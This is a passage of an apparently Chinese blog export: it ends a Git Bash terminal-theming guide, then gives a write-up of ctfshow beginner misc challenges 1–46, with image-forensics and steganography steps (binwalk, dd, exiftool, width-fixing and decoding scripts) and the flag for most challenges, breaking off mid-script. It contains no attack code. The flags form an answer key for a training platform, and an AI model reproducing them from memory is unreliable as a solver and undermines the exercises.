~/.bashrc</span><br></pre></td></tr></table></figure><p>然后就可以看到已经加载好主题了，但是重新打开可能会爆一个Warning</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120134047490.png" alt="image-20241120134047490"></p><p>这个警告就是说 Git Bash 检测到 <code>~/.bashrc</code> 文件存在，但找不到其他通常用于配置登录或非登录 shell 启动时的文件。因为这是Windows下的所以可以忽略这个警告，但是如果不想看到这个警告，可执行如下命令，再次打开就不会有警告了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;if [ -f ~/.bashrc ]; then\n  . ~/.bashrc\nfi&quot; &gt; ~/.bash_profile</span><br></pre></td></tr></table></figure><h3 id="Visual-Studio-Code-终端美化"><a href="#Visual-Studio-Code-终端美化" class="headerlink" title="Visual Studio Code 终端美化"></a>Visual Studio Code 终端美化</h3><p>我们打开VSC终端可以看到，主题已经变了但有一些符号什么的加载不出来</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120135417079.png" alt="image-20241120135417079"></p><p>打开设置</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120135450333.png" alt="image-20241120135450333"></p><p>搜索终端，找到<code>Font Family</code>，将我们之前下载的字体名称输入进去，然后就可以看到下边的终端已经能正常加载符号了</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120135613455.png" alt="image-20241120135613455"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow misc入门</title>
      <link href="/articles/90ee655.html"/>
      <url>/articles/90ee655.html</url>
      
        <content type="html"><![CDATA[<h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc 1"></a>misc 1</h2><p>图片上直接就是flag<br>ctfshow{22f1fb91fc4169f1c9411ce632a0ed8d}</p><h2 id="misc-2"><a href="#misc-2" class="headerlink" title="misc 2"></a>misc 2</h2><p>打开是图片的十六进制，直接转图片，拿到flag<br>ctfshow{6f66202f21ad22a2a19520cdd3f69e7b}</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241019224000240.png" alt="image-20241019224000240"></p><h2 id="misc-3"><a href="#misc-3" class="headerlink" title="misc 3"></a>misc 3</h2><p>bpg格式，查看拿到flag<br>ctfshow{aade771916df7cde3009c0e631f9910d}</p><h2 id="misc-4"><a href="#misc-4" class="headerlink" title="misc 4"></a>misc 4</h2><p>被拆分了，改文件后缀就行<br>ctfshow{4314e2b15ad9a960e7d9d8fc2ff902da}</p><h2 id="misc-5"><a href="#misc-5" class="headerlink" title="misc 5"></a>misc 5</h2><p>藏在文件信息头中</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241019230410154.png" alt="image-20241019230410154"></p><p>ctfshow{2a476b4011805f1a8e4b906c8f84083e}  </p><h2 id="misc-6"><a href="#misc-6" class="headerlink" title="misc 6"></a>misc 6</h2><p>010直接看，拿到ctfshow{d5e937aefb091d38e70d927b80e1e2ea}</p><h2 id="misc-7"><a href="#misc-7" class="headerlink" title="misc 7"></a>misc 7</h2><p>010直接看，拿到ctfshow{c5e77c9c289275e3f307362e1ed86bb7}</p><h2 id="misc-8"><a href="#misc-8" class="headerlink" title="misc 8"></a>misc 8</h2><blockquote><p>flag在图片文件中图片文件中。</p></blockquote><p>foremost提取出来一张png，拿到ctfshow{1df0a9a3f709a2605803664b55783687}</p><h2 id="misc-9"><a href="#misc-9" class="headerlink" title="misc 9"></a>misc 9</h2><blockquote><p>flag在图片块里。</p></blockquote><p>010直接看，拿到ctfshow{5c5e819508a3ab1fd823f11e83e93c75}</p><h2 id="misc-10"><a href="#misc-10" class="headerlink" title="misc 10"></a>misc 10</h2><blockquote><p>flag在图片数据里。</p></blockquote><p>binwalk提取出来，10E5打开拿到ctfshow{353252424ac69cb64f643768851ac790}</p><h2 id="misc-11"><a href="#misc-11" class="headerlink" title="misc 11"></a>misc 11</h2><blockquote><p>flag在另一张图里。</p></blockquote><p>把第二个 IDAT 数据删除，重新打开图片发现有flag：ctfshow{44620176948fa759d3eeafeac99f1ce9}</p><h2 id="misc-12"><a href="#misc-12" class="headerlink" title="misc 12"></a>misc 12</h2><blockquote><p>flag在另一张图里。</p></blockquote><p>和11解法一样，不过是多删几个<br>ctfshow{10ea26425dd4708f7da7a13c8e256a73}</p><h2 id="misc-13"><a href="#misc-13" class="headerlink" title="misc 13"></a>misc 13</h2><blockquote><p>flag位置在图片末尾。</p></blockquote><p>ct¹f…s†hªoKw°{!aeS6¥eT446xc%4Ý8ïf«73•9b‚7ºeEb|2Td~1:däeñ6úeõ412fT8ñ329éal}<br>隔一个提取，一共有四串，但只有一个为真<br>ctfshow{ae6e46c48f739b7eb2d1de6e412f839a}<br>ctfshow{ae6e3ea48f518b7e42d7de6f412f839a}真<br>ctfshow{1e3e2ed48f518b7e4267de1c412a839a}<br>ctfshow{ae6e3fa48f528b1742d72e6f41298380}</p><h2 id="misc-14"><a href="#misc-14" class="headerlink" title="misc 14"></a>misc 14</h2><blockquote><p>flag在那张图里。</p></blockquote><p>binwalk自动提取失败，使用dd手动提取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e --run-as=root ./misc14.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, EXIF standard</span><br><span class="line">12            0xC             TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">1681          0x691           TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">2103          0x837           JPEG image data, JFIF standard 1.01</span><br><span class="line"></span><br><span class="line"># 提取从 0x0 开始的 JPEG 图像</span><br><span class="line">dd if=misc14.jpg of=image1.jpg bs=1 skip=0 count=2103</span><br><span class="line"></span><br><span class="line"># 提取从 0xC 开始的 TIFF 图像</span><br><span class="line">dd if=misc14.jpg of=image2.tiff bs=1 skip=12 count=1673</span><br><span class="line"></span><br><span class="line"># 提取从 0x691 开始的另一个 TIFF 图像</span><br><span class="line">dd if=misc14.jpg of=image3.tiff bs=1 skip=1681 count=422</span><br><span class="line"></span><br><span class="line"># 提取从 0x837 开始的 JPEG 图像</span><br><span class="line">dd if=misc14.jpg of=image4.jpg bs=1 skip=2103</span><br></pre></td></tr></table></figure><p>拿到flag：ctfshow{ce520f767fc465b0787cdb936363e694}<br>也可以复制在010里FFD8FF到FFD9的部分，然后新建一个PNG图片</p><h2 id="misc-15"><a href="#misc-15" class="headerlink" title="misc 15"></a>misc 15</h2><blockquote><p>flag被跳过去了。</p></blockquote><p>010直接拿到flag：ctfshow{fbe7bb657397e6e0a6adea3e40265425}</p><h2 id="misc-16"><a href="#misc-16" class="headerlink" title="misc 16"></a>misc 16</h2><blockquote><p>flag在图片数据里。</p></blockquote><p>binwalk提取ctfshow{a7e32f131c011290a62476ae77190b52}</p><h2 id="misc-17"><a href="#misc-17" class="headerlink" title="misc 17"></a>misc 17</h2><blockquote><p>flag在图片数据里。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020241021084923.png" alt="Pasted image 20241021084923"></p><p>使用zsteg发现隐写数据，然后分离，再使用binwalk分离，拿到一张png图片，图片上就是flag<br>ctfshow{0fe61fc42e8bbe55b9257d251749ae45}</p><h2 id="misc-18"><a href="#misc-18" class="headerlink" title="misc 18"></a>misc 18</h2><blockquote><p>flag在标题、作者、照相机和镜头型号里。</p></blockquote><p>按照题目，查看属性拿到flag。ctfshow{325d60c208f728ac17e5f02d4cf5a839}</p><h2 id="misc-19"><a href="#misc-19" class="headerlink" title="misc 19"></a>misc 19</h2><blockquote><p>flag在主机上的文档名里。</p></blockquote><p>010打开，拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020241021085250.png" alt="Pasted image 20241021085250"></p><p>ctfshow{dfdcf08038cd446a5eb50782f8d3605d}</p><p>或者是使用exiftool或<a href="https://exif.tuchong.com/">在线exif查看器</a><br>用strings也可以，flag就在最上边</p><h2 id="misc-20"><a href="#misc-20" class="headerlink" title="misc 20"></a>misc 20</h2><blockquote><p>flag在评论里。</p></blockquote><p>exiftools查看，发现<code>西替爱抚秀大括号西九七九六四必一诶易西爱抚零六易一弟七九西二一弟弟诶弟五九三易四二大括号</code><br>ctfshow{c97964b1aecf06e1d79c21ddad593e42}</p><h2 id="misc-20-1"><a href="#misc-20-1" class="headerlink" title="misc 20"></a>misc 20</h2><blockquote><p>flag在序号里。</p></blockquote><p>exiftool发现ctfshow{}和686578285826597329，686578285826597329&#x3D;&gt;hex(X&amp;Ys)</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020241021093309.png" alt="Pasted image 20241021093309"></p><p>最终发现是分段十进制数转十六进制数，3902939465&#x3D;&gt;e8a22149<br>ctfshow{e8a221498d5c073b4084eb51b1a1686d}</p><h2 id="misc-22"><a href="#misc-22" class="headerlink" title="misc 22"></a>misc 22</h2><blockquote><p>flag在图片里。</p></blockquote><p>缩略图隐写（thumbnail隐写），可以用magicexif，或者随波逐流，也可以用exiftool</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -ThumbnailImage -b misc22.jpg &gt; 1.jpg</span><br></pre></td></tr></table></figure><p>ctfshow{dbf7d3f84b0125e833dfd3c80820a129}</p><h2 id="misc-23"><a href="#misc-23" class="headerlink" title="misc 23"></a>misc 23</h2><blockquote><p>flag在时间里。</p></blockquote><p>exiftool查看发现</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020241021095447.png" alt="Pasted image 20241021095447"></p><p>ctfshow{}, UnixTimestamp&#x3D;&gt;时间戳， DECtoHEX&#x3D;&gt;十进制数转十六进制数，getflag<br>1997-09-22 02:17:02+08:00, 2055-07-15 12:14:48+08:00, 2038-05-05 16:50:45+08:00, 1984-08-03 18:41:46+08:00<br>874865822</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1997-09-22 02:17:02+08:00 =&gt; 874865822  =&gt; 3425649e</span><br><span class="line">2055-07-15 12:14:48+08:00 =&gt; 2699237688 =&gt; a0e31938</span><br><span class="line">2038-05-05 16:50:45+08:00 =&gt; 2156662245 =&gt; 808c0de5</span><br><span class="line">1984-08-03 18:41:46+08:00 =&gt; 460377706  =&gt; 1b70ce6a</span><br></pre></td></tr></table></figure><p>ctfshow{3425649ea0e31938808c0de51b70ce6a}</p><h2 id="misc-24"><a href="#misc-24" class="headerlink" title="misc 24"></a>misc 24</h2><blockquote><p>flag在图片上面。</p></blockquote><p>BMP宽高修复，直接用PuzzleSolve一把梭就行，也可手动改高度为FA，flag：<br>ctfshow{dd7d8bc9e5e873eb7da3fa51d92ca4b7}</p><h2 id="misc-25"><a href="#misc-25" class="headerlink" title="misc 25"></a>misc 25</h2><blockquote><p>flag在图片下面。</p></blockquote><p>PNG图片宽高修复，属于CRC校验那种，一把梭or手动改，仍是FA，flag：<br>ctfshow{494f611cc5842dd597f460874ce38f57}</p><h2 id="misc-26"><a href="#misc-26" class="headerlink" title="misc 26"></a>misc 26</h2><blockquote><p>flag还是在图片下面，但到底有多下面？。</p></blockquote><p>同25，flag：ctfshow{94aef125e087a7ccf2e28e742efd704c}</p><h2 id="misc-27"><a href="#misc-27" class="headerlink" title="misc 27"></a>misc 27</h2><blockquote><p>flag在图片下面</p></blockquote><p>JPG宽高修复，flag：ctfshow{5cc4f19eb01705b99bf41492430a1a14}</p><h2 id="misc-28"><a href="#misc-28" class="headerlink" title="misc 28"></a>misc 28</h2><blockquote><p>flag在图片下面。</p></blockquote><p>GIF宽高修复，flag：ctfshow{59c8bc525426166b1c893fe12a387fd7}</p><h2 id="misc-29"><a href="#misc-29" class="headerlink" title="misc 29"></a>misc 29</h2><blockquote><p>flag在图片下面。</p></blockquote><p>同28，010查找每一帧的高度9600替换为FF00，然后拆帧，拿到flag<br>ctfshow{03ce5be6d60a4b3c7465ab9410801440}</p><h2 id="misc-30"><a href="#misc-30" class="headerlink" title="misc 30"></a>misc 30</h2><blockquote><p>正确的宽度是950。</p></blockquote><p>照着题目做就行，拿到flag：ctfshow{6db8536da312f6aeb42da2f45b5f213c}</p><h2 id="misc-31"><a href="#misc-31" class="headerlink" title="misc 31"></a>misc 31</h2><blockquote><p>高度是正确的，但正确的宽度是多少呢。</p></blockquote><p>PuzzleSolve一把梭，flag：ctfshow{fb09dcc9005fe3feeefb73646b55efd5}</p><h2 id="misc-32"><a href="#misc-32" class="headerlink" title="misc 32"></a>misc 32</h2><blockquote><p>高度是正确的，但正确的宽度是多少呢</p></blockquote><p>宽高修复一把梭，flag：ctfshow{685082227bcf70d17d1b39a5c1195aa9}</p><h2 id="misc-33"><a href="#misc-33" class="headerlink" title="misc 33"></a>misc 33</h2><blockquote><p>出题人丧心病狂，把高度也改了</p></blockquote><p>宽高修复一把梭，flag为：ctfshow{03070a10ec3a3282ba1e352f4e07b0a9}</p><h2 id="misc-34"><a href="#misc-34" class="headerlink" title="misc 34"></a>misc 34</h2><blockquote><p>出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900</p></blockquote><p>宽高修复一把梭，flag为：ctfshow{03e102077e3e5de9dd9c04aba16ef014}</p><h2 id="misc-35"><a href="#misc-35" class="headerlink" title="misc 35"></a>misc 35</h2><blockquote><p>出题人负隅顽抗，但我们知道正确宽度肯定大于900</p></blockquote><p>先改高度，改到600，看到下边有一坨乱码，证明高度差不多了。然后开始遍历宽度，在990到1000左右都能正常显示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">filename = <span class="string">&quot;misc35.jpg&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">901</span>,<span class="number">1200</span>):</span><br><span class="line">        name = <span class="built_in">str</span>(i) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">        f1 = <span class="built_in">open</span>(name,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        new = data[:<span class="number">159</span>]+struct.pack(<span class="string">&#x27;&gt;h&#x27;</span>,i)+data[<span class="number">161</span>:]</span><br><span class="line">        f1.write(new)</span><br><span class="line">        f1.close()</span><br></pre></td></tr></table></figure><p>ctfshow{ca35201ca9ed607e5a68f44ef573fbc3}</p><h2 id="misc-36"><a href="#misc-36" class="headerlink" title="misc 36"></a>misc 36</h2><blockquote><p>出题人坦白从宽，正确的宽度在920-950之间</p></blockquote><p>先改高度为FF00，然后进行遍历，最后发现941应该是原来的宽度，flag：ctfshow{1ebf739f832906d60f57436b8179166f}<br>遍历脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">filename = <span class="string">&quot;misc36.gif&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">920</span>,<span class="number">951</span>):</span><br><span class="line">        name = <span class="built_in">str</span>(i) + <span class="string">&quot;.gif&quot;</span></span><br><span class="line">        f1 = <span class="built_in">open</span>(name,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        new = data[:<span class="number">38</span>]+struct.pack(<span class="string">&#x27;&gt;h&#x27;</span>,i)[::-<span class="number">1</span>]+data[<span class="number">40</span>:]</span><br><span class="line">        f1.write(new)</span><br><span class="line">        f1.close()</span><br></pre></td></tr></table></figure><h2 id="misc-37"><a href="#misc-37" class="headerlink" title="misc 37"></a>misc 37</h2><blockquote><p>flag在图片里</p></blockquote><p>是GIF动图，直接拆，flag在第8、13、20、30、33帧<br>ctfshow{2056782cd57b13261dcbbe3d6eecda17}</p><h2 id="misc-38"><a href="#misc-38" class="headerlink" title="misc 38"></a>misc 38</h2><blockquote><p>flag在图片里</p></blockquote><p>用010打开，发现有8个FFD9，十分有九分的不对劲，看了其他大佬的wp发现是APNG格式<br>可以用honeyview&#x2F;bandview逐帧查看，也可以用apng直接拆&#x2F;转gif后拆。<br>flag为：ctfshow{48b722b570c603ef58cc0b83bbf7680d}</p><h2 id="misc-39"><a href="#misc-39" class="headerlink" title="misc 39"></a>misc 39</h2><blockquote><p>flag就像水，忽快忽慢地流</p></blockquote><p>是GIF时间间隔隐写，用PuzzleSolve一把梭，提取出时间间隔，然后360&#x3D;&gt;0，370&#x3D;&gt;1，最后再按照七位二进制数转ASCII字符串。也可用 imagemagick工具：identify -format “%T “ misc39.gif提取出，不过是36&#x3D;&gt;0，37&#x3D;&gt;1。下边为Python脚本实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = <span class="built_in">eval</span>(file.read())</span><br><span class="line">    <span class="comment"># data = file.read().split()</span></span><br><span class="line"><span class="comment"># 替换规则：360 -&gt; 0, 370 -&gt; 1</span></span><br><span class="line">binary_string = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> num == <span class="string">&#x27;360&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">for</span> num <span class="keyword">in</span> data])</span><br><span class="line"><span class="comment"># binary_string = &#x27;&#x27;.join([&#x27;0&#x27; if num == &#x27;36&#x27; else &#x27;1&#x27; for num in data])</span></span><br><span class="line">ascii_string = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(binary_string[i:i+<span class="number">7</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">7</span>)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ascii_string)</span><br></pre></td></tr></table></figure><p>flag为ctfshow{52812ff995fb7be268d963a9ebca0459}</p><h2 id="misc-40"><a href="#misc-40" class="headerlink" title="misc 40"></a>misc 40</h2><blockquote><p>flag就像歌，有长有短仿佛岁月悠悠</p></blockquote><p>又是一个apng，拆了，应该是在apngframe01.txt这种记录详细信息文件中的隐写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">69</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./misc40/apngframe%02d.txt&#x27;</span> % i) <span class="keyword">as</span> f:</span><br><span class="line">        s = f.read()</span><br><span class="line">        c = <span class="built_in">int</span>(s.split(<span class="string">&quot;/&quot;</span>)[<span class="number">0</span>][<span class="number">6</span>:])</span><br><span class="line">        <span class="built_in">print</span>(c,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        flag += <span class="built_in">chr</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>![Pasted image 20241021224514](..&#x2F;..&#x2F;..&#x2F;program&#x2F;aaaaaaaaaaa&#x2F;notes&#x2F;ctfshow&#x2F;misc入门&#x2F;image&#x2F;Pasted image 20241021224514.png)</p><p>flag：ctfshow{95ca0297dff0f6b1bdaca394a6fcb95b}</p><h2 id="misc-41"><a href="#misc-41" class="headerlink" title="misc 41"></a>misc 41</h2><blockquote><p>（本题为Misc入门图片篇和愚人节比赛特别联动题）<br>H4ppy Apr1l F001’s D4y！<br>愚人节到了，一群笨蛋往南飞，一会儿排成S字，一会儿排成B字。</p></blockquote><p>发现少了文件头，补上，做不出来，还原。再看看题目，F001不是leet，是十六进制字节，搜索F001</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020241021114909.png" alt="Pasted image 20241021114909"></p><p>拿到flag，ctfshow{fcbd427caf4a52f1147ab44346cd1cdd}</p><h2 id="misc-42"><a href="#misc-42" class="headerlink" title="misc 42"></a>misc 42</h2><blockquote><p>flag有多长？2cm……不好意思打错了，41位</p></blockquote><p>41位flag，扔随波逐流里发现不止一个IDAT块，也不是覆盖，看看长度，大多都在40多到126之间，那很有可能是ASCII码转字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./misc42/1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化flag字符串</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历文件内容逐行提取长度并转换为ASCII字符</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;长度&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">        <span class="comment"># 提取长度值并转为整数，再转为对应的ASCII字符</span></span><br><span class="line">        length = <span class="built_in">int</span>(line.split(<span class="string">&quot;长度: &quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;,&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(length,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        flag += <span class="built_in">chr</span>(length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020241021231216.png" alt="Pasted image 20241021231216"></p><p>拿到flag，ctfshow{078cbd0f9c8d3f2158e70529f8913c65}</p><h2 id="misc-43"><a href="#misc-43" class="headerlink" title="misc 43"></a>misc 43</h2><blockquote><p>错误中隐藏着通往正确答案的道路</p></blockquote><p>扔随波逐流里，发现有12个IDAT块，11个长度大部分为384，且crc校验均是错误的。根据题面，将错误的crc校验码扔赛博厨子，拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020241022095645.png" alt="Pasted image 20241022095645"></p><p>flag：ctfshow{6eb2589ffff5e390fe6b87504dbc0892}</p><h2 id="misc-44"><a href="#misc-44" class="headerlink" title="misc 44"></a>misc 44</h2><blockquote><p>错误中还隐藏着坑</p></blockquote><p>扔随波逐流，发现有N多个IDAT块，crc校验True和False交替，应该是01替换，上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_crc_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="comment"># 打开文件并读取所有行</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 按行提取 CRC 校验结果（True 或 False）</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;CRC校验结果: &quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;True&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">                binary_str += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                binary_str += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将二进制串转换为十六进制串</span></span><br><span class="line">    hex_str = <span class="built_in">hex</span>(<span class="built_in">int</span>(binary_str, <span class="number">2</span>))[<span class="number">2</span>:]  <span class="comment"># 去掉 &#x27;0x&#x27; 前缀</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Binary string: <span class="subst">&#123;binary_str&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Hexadecimal string: <span class="subst">&#123;hex_str&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">process_crc_file(<span class="string">&#x27;./1.txt&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后把十六进制扔赛博厨子，拿到flag：ctfshow{cc1af32bf96308fc1263231be783f69e}</p><h2 id="misc-45"><a href="#misc-45" class="headerlink" title="misc 45"></a>misc 45</h2><blockquote><p>有时候也需要换一换思维格式</p></blockquote><p>换成bmp格式，然后binwalk提取出来一个压缩包，里边就是flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;misc45.png&#x27;</span>)</span><br><span class="line">img.save(<span class="string">&#x27;misc45.bmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ctfshow{057a722a5587979c34966c2436283e70}</p><h2 id="misc-46"><a href="#misc-46" class="headerlink" title="misc 46"></a>misc 46</h2><blockquote><p>你见过扶乩吗</p></blockquote><p>打开图片发现这玩意儿到处晃，用identity查看发现，174+49这些偏移量</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241022164110167.png" alt="image-20241022164110167"></p><p>根据GIF偏移量来绘图，绘制完，打开png图片就是flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 GIF 